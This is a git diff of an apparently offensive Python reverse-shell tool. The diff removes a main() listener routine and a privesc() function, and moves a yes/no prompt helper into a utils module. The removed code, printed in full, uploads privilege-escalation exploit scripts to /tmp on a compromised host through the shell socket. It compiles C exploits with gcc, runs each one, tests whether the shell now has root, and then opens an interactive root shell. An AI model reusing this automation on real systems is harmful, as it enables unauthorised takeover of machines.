@@ -7,68 +7,7 @@ import socket
 import struct
 import random
 import base64
-from time import sleep
-
-def main(port, interface):
-    persistent = False
-    hosts = None
-    sock = None
-
-    if hosts:
-        hosts = hosts.split(",")
-
-    try:
-        sock = Socket(port, interface)
-        sock.listen(hosts)
-        shell = Shell(sock, persistent)
-        print('[+] Identifying privesc capabilities')
-        privesc(sock, shell)
-
-    except KeyboardInterrupt:
-        sock.close()
-
-def privesc(sock, shell):
-    directory = './plugins/privesc/'
-    counter = 1
-    for filename in os.listdir(directory):
-        f = os.path.join(directory, filename)
-        if os.path.isfile(f):
-            print('[+] Uploading privesc script number {}'.format(counter))
-            rsh = RSH(sock)
-            if '.sh' in f:
-                ext = '.sh'
-            elif '.c' in f:
-                ext = '.c'
-            rsh.upload('{0}'.format(f), '/tmp/exploit{0}{1}'.format(counter, ext))
-            sock.send('cd /tmp\n')
-            if ext == '.c':
-                sock.send('gcc exploit{0}{1} -o exploit{0}\n'.format(counter, ext))
-                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
-                sock.send('./exploit{0}\n'.format(counter, ext))
-            elif ext == '.sh':
-                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
-                sock.send('./exploit{0}{1}\n'.format(counter, ext))
-            sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
-            sleep(2)
-            if rsh.file_exists('/tmp/valid_root') == True:
-                print('[+] Privesc exploit worked !')
-                sock.send('rm /tmp/valid_root\n')
-                sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
-                shell.interact()
-                sock.close()
-            else:
-                print("")
-                sock.send('rm /tmp/exploit*\n') 
-            counter += 1
-
-
-def prompt(message):
-    answer = ""
-    while(answer != "Y" and answer != "N"):
-        answer = input(message + " (Y/N): ")
-        answer = answer.upper()
-    return answer == "Y"
-
+import utils
 
 class Socket:
     sock = None
@@ -415,7 +354,7 @@ class RSH:
         print("[+] Checking %s for write permissions.." % remotedir.replace("$(pwd)/", ""))
         if self.is_writable(remotedir):
             if self.file_exists(remotefile) and self.is_writable(remotefile):
-                if not prompt("[?] Remote file %s exists, overwrite?" % remotefile.replace("$(pwd)/", "")):
+                if not utils.prompt("[?] Remote file %s exists, overwrite?" % remotefile.replace("$(pwd)/", "")):
                     print("[-] Aborted file upload.")
                     return False
 
@@ -439,7 +378,7 @@ class RSH:
             print("[+] Successfully uploaded file to %s!" % remotefile.replace("$(pwd)/", ""))
             return True
         else:
-            if prompt("[?] Permission denied, write to /tmp instead?"):
+            if utils.prompt("[?] Permission denied, write to /tmp instead?"):
                 return self.upload(localfile, self._generate_tmpname(localfile))
             else:
                 print("[-] Aborted file upload.")
